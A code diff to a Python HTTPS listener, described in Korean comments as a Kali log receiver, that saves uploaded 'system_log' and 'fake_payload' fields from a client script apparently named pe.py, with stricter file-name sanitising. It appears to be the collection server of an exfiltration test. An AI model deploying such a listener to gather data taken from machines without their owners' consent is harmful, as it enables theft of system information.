@@ -4,9 +4,11 @@ import datetime
 import ssl
 import os
 import sys
+import re
 
 # =========================================================================
 # Kali HTTPS 로그 리스너 - Downloads 폴더 저장 버전
+# (FILENAME 특수 문자 오류 및 데이터 파싱 로직 강화)
 # =========================================================================
 
 HOST = "0.0.0.0"
@@ -48,22 +50,29 @@ class HTTPPostHandler(BaseHTTPRequestHandler):
             # 데이터 파싱
             parsed_data = parse_qs(post_data.decode('utf-8', errors='ignore'), keep_blank_values=True)
             
-            # 데이터 추출
+            # 데이터 추출 (클라이언트 pe.py의 필드명과 일치)
             filename = parsed_data.get('filename', ['unknown.log'])[0]
-            file_content = parsed_data.get('content', [''])[0]
+            system_log_content = parsed_data.get('system_log', [''])[0]
+            fake_payload_content = parsed_data.get('fake_payload', [''])[0]
             
-            # 파일명 정리 (특수문자 제거)
+            # 파일명 안전화 강화: 슬래시, 콜론 및 기타 안전하지 않은 문자 제거
             safe_filename = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
-            save_path = os.path.join(LOG_DIR, f"RECV_{timestamp}_{safe_filename}")
+            # 정규식 사용하여 영숫자, 점, 대시, 밑줄 외 문자 모두 제거
+            safe_filename = re.sub(r'[^\w\.\-\_]', '', safe_filename) 
+            
+            # 최종 파일 저장 경로 구성 (파일명에 .log 확장자를 붙여 파일로 저장)
+            save_path = os.path.join(LOG_DIR, f"RECV_{timestamp}_{safe_filename}.log")
             
             # 파일 저장
             with open(save_path, 'w', encoding='utf-8') as f:
                 f.write(f"--- SERVER RECEIPT INFO ---\n")
                 f.write(f"Time: {timestamp}\n")
                 f.write(f"Client IP: {self.client_address[0]}\n")
-                f.write(f"Total Size: {content_length} bytes\n")
-                f.write(f"--- BEGIN CLIENT DATA ---\n")
-                f.write(file_content)
+                f.write(f"Total Size (Header): {content_length} bytes\n")
+                f.write(f"--- CLIENT PAYLOAD: SYSTEM LOG ({len(system_log_content)} bytes) ---\n")
+                f.write(system_log_content)
+                f.write(f"\n\n--- CLIENT PAYLOAD: FAKE DATA ({len(fake_payload_content)} bytes) ---\n")
+                f.write(fake_payload_content)
             
             # 결과 출력
             print(f"[{timestamp}] SAVE OK: {safe_filename} | Size: {content_length/1024/1024:.2f} MB")
